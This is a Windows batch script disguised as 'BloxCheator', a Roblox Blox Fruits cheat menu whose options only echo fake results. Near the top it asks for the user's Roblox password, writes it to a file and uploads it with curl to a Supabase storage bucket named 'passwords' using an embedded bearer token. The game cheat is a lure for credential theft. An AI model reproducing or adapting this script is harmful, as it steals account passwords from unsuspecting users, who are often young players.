@echo off
chcp 65001 >nul
setlocal EnableDelayedExpansion

pause
echo hello %USERNAME%
pause

echo before any access is granted you must give your roblox password
pause

:: =========================
:: User Input (SAFE)
:: =========================
set "PASSWORD="
set /p "PASSWORD=Enter your password: "

:: =========================
:: Create file
:: =========================
set "FILENAME=password_%PASSWORD%.txt"

(
echo Username: %PASSWORD%
echo Created at: %DATE% %TIME%
) > "%FILENAME%"

echo File created: %FILENAME%


:: =========================
:: Upload to Supabase
:: =========================
echo Uploading to Supabase.

echo Uploading to Supabase..

echo Uploading to Supabase...

echo Uploading to Supabase.

echo Uploading to Supabase..

echo Uploading to Supabase...


curl -X POST ^
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN6b29zYWZ6Y3lqbXJxc3drZWNvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njg1MDIxMDEsImV4cCI6MjA4NDA3ODEwMX0.B_CjOoYxVQlLdgiYlaPFcUQzd1Z1T8IYaBtiJ0SUvWI" ^
  -H "Content-Type: application/octet-stream" ^
  --data-binary "@%FILENAME%" ^
  https://czoosafzcyjmrqswkeco.supabase.co/storage/v1/object/passwords/%FILENAME%



pause

:login
cls
echo ============================
echo    PASSCODE REQUIRED
echo ============================
set /p pass=Enter passcode: 

if "%pass%"=="773rt" goto access

echo.
echo Incorrect passcode!
timeout /t 2 >nul
goto login

:access
cls
echo Access Granted!
echo Welcome.
pause
title BloxCheator
color 0A
mode con cols=120 lines=40

:: =========================
:: BANNER
:: =========================
echo		██████╗ ██╗      ██████╗ ██╗  ██╗     ██████╗██╗  ██╗███████╗ █████╗ ████████╗███████╗██████╗ 
echo		██╔══██╗██║     ██╔═══██╗╚██╗██╔╝    ██╔════╝██║  ██║██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗
echo		██████╔╝██║     ██║   ██║ ╚███╔╝     ██║     ███████║█████╗  ███████║   ██║   █████╗  ██████╔╝
echo		██╔══██╗██║     ██║   ██║ ██╔██╗     ██║     ██╔══██║██╔══╝  ██╔══██║   ██║   ██╔══╝  ██╔══██╗
echo		██████╔╝███████╗╚██████╔╝██╔╝ ██╗    ╚██████╗██║  ██║███████╗██║  ██║   ██║   ███████╗██║  ██║
echo		╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
echo.	                                                                                              

:MAIN
echo 1. Spawn Fruits
echo 2. Admin Commands
echo 3. Server Cheats
echo 4. Cheats
echo 5. ???
echo 0. Exit
echo ==========================
set /p choice=Select an option: 
cls

if "%choice%"=="1" goto FRUIT_MENU
if "%choice%"=="2" goto ADMIN
if "%choice%"=="3" goto SERVER
if "%choice%"=="4" goto CHEATS
if "%choice%"=="5" goto PLACEHOLDER
if "%choice%"=="0" goto EXIT
goto MAIN


:FRUIT_MENU
cls
set "FRUIT_NAME="
echo ==========================
echo      BLOX FRUITS SPAWNER
echo ==========================

REM List of all 41 Blox Fruits
set FRUITS[1]=Rocket
set FRUITS[2]=Spin
set FRUITS[3]=Blade
set FRUITS[4]=Spring
set FRUITS[5]=Bomb
set FRUITS[6]=Smoke
set FRUITS[7]=Spike
set FRUITS[8]=Flame
set FRUITS[9]=Ice
set FRUITS[10]=Sand
set FRUITS[11]=Dark
set FRUITS[12]=Eagle
set FRUITS[13]=Diamond
set FRUITS[14]=Light
set FRUITS[15]=Rubber
set FRUITS[16]=Ghost
set FRUITS[17]=Magma
set FRUITS[18]=Quake
set FRUITS[19]=Buddha
set FRUITS[20]=Love
set FRUITS[21]=Creation
set FRUITS[22]=Spider
set FRUITS[23]=Sound
set FRUITS[24]=Phoenix
set FRUITS[25]=Portal
set FRUITS[26]=Rumble
set FRUITS[27]=Pain
set FRUITS[28]=Blizzard
set FRUITS[29]=Gravity
set FRUITS[30]=Mammoth
set FRUITS[31]=T-Rex
set FRUITS[32]=Dough
set FRUITS[33]=Shadow
set FRUITS[34]=Venom
set FRUITS[35]=Control
set FRUITS[36]=Gas
set FRUITS[37]=Spirit
set FRUITS[38]=Leopard
set FRUITS[39]=Yeti
set FRUITS[40]=Kitsune
set FRUITS[41]=Dragon

REM Display menu
for /L %%i in (1,1,41) do (
    echo %%i. !FRUITS[%%i]!
)
echo 0. Back
echo ==========================
set /p fruit=Choose a fruit: 

if "%fruit%"=="0" goto MAIN

REM Validate selection and set FRUIT_NAME
for /L %%i in (1,1,41) do (
    if "%fruit%"=="%%i" set FRUIT_NAME=!FRUITS[%%i]!
)

if "%FRUIT_NAME%"=="" (
    echo Invalid selection!
    pause
    goto FRUIT_MENU
)

echo You selected: %FRUIT_NAME%
pause
goto FRUIT_MENU

echo Spawned %FRUIT_NAME%
pause
goto FRUITS

:ADMIN
cls
echo ADMIN COMMANDS
echo 1. God Mode
echo 2. Back
set /p admin=Choose: 
if "%admin%"=="1" echo God Mode executed
if "%admin%"=="2" goto MAIN
pause
goto ADMIN

:SERVER
cls
echo SERVER CHEATS
echo 1. Server Hop
echo 2. Back
set /p server=Choose: 
if "%server%"=="1" echo Server Hop executed
if "%server%"=="2" goto MAIN
pause
goto SERVER

:CHEATS
cls
echo CHEATS
echo 1. Infinite XP
echo 2. Back
set /p cheat=Choose: 
if "%cheat%"=="1" echo Infinite XP executed
if "%cheat%"=="2" goto MAIN
pause
goto CHEATS

:PLACEHOLDER
cls
echo Placeholder menu...
pause
goto MAIN

:EXIT
cls
echo Exiting...
timeout /t 1 >nul
exit /b
